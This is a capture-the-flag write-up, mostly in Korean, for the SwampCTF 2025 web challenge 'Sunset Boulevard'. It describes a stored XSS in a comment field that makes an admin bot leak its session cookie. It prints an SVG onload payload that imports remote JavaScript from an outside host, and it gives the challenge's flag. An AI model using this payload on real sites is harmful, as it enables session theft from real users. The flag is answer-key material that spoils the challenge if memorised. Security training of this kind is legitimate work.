# 🐊 SwampCTF 2025 Writeup - [Sunset Boulevard]

**Category:** [Web]  
**Points:** [100]  
**Tags:** `CTF`, `[Web]`, `swampctf`  

---
## 📚 Table of Contents
- [🔍 Recon](#-recon)
- [🎯 The Goal](#-the-goal)
- [💉 Exploit](#-exploit)
- [🍪 Info Leakage or Gain](#-info-leakage-or-gain)
- [👑 Accessing the Flag](#-accessing-the-flag)
- [🧠 Conclusion](#-conclusion)

---
## 🔍 Recon

![문제 웹](./Pasted%20image%20250403002957.png)

- 팬들이 메시지를 작성할 수 있는 웹페이지 제공
- 관리자 페이지가 존재한다는 소문이 있음
- 힌트에 따르면 `https://artoo.love`를 통한 공격 가능성 존재

---

## 🎯 The Goal

> 플래그를 얻기 위해 해야 할 주요 목표 정리
![문제 웹](./Pasted%20image%20250403003017.png)
- [ ] Stored XSS 삽입
- [ ] 관리자 봇을 통한 스크립트 실행 유도
- [ ] 세션/쿠키 탈취 또는 플래그 출력

---

## 💉 Exploit

### 🛠️ Step 1. Stored XSS 시도
![문제 웹](./Pasted%20image%20250403003110.png)

- `https://artoo.love`에서 JS 페이로드 생성
- 삽입한 XSS 페이로드 예시:
```
<svg onload="import('//popjs.dev/yOPcj')"></svg>
```

![문제 웹](./Pasted%20image%20250403003153.png)

- 댓글란에 삽입하여 저장 → **Stored XSS** 성공

### 🛠️ Step 2. 쿠키 탈취

![문제 웹](./Pasted%20image%20250403003217.png)

![문제 웹](./Pasted%20image%20250403003242.png)

- 일정 시간 후 관리자 봇이 페이지 방문
- XSS 실행 → 쿠키 전송/세션 탈취 👉 flag 확인 성공

#### 🛠️ 사용한 도구
  - [ ] artoo.love
  - [ ] JS 이벤트 삽입 (svg, script 등)

---

## 🍪 Info Leakage or Gain

- 관리자 세션 쿠키 또는 인증 토큰 탈취 가능
- 플래그가 쿠키 또는 응답값에 포함되어 있음

---

## 👑 Accessing the Flag

```
swampCTF{THIS_MUSICAL_WAS_REVOLUTIONARY_BUT_ALSO_KIND_OF_A_SNOOZE_FEST}
```

---

## 🧠 Conclusion

배운 점, 보안 상 주의할 점, 이 취약점의 영향 요약:

- Stored XSS는 여전히 심각한 위협이 될 수 있음
- 사용자 입력 필터링 및 Content Security Policy 설정이 매우 중요
- 관리자 봇이 입력값을 직접 렌더링하는 구조는 취약함
- 외부 스크립트를 참조하는 단순한 XSS 페이로드도 매우 치명적일 수 있음

---

_📚 Writeup by [@ChaeYum1](https://github.com/ChaeYum1)_
